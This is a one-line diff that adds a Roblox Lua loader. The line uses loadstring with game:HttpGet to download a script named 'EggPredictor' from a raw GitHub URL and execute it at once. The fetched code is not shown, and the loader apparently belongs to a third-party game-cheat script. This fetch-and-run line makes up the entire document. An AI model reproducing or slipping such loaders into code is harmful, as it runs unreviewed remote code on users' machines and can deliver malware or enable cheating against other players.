@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeWizard01/EggPredictor/refs/heads/main/Files/Script"))()
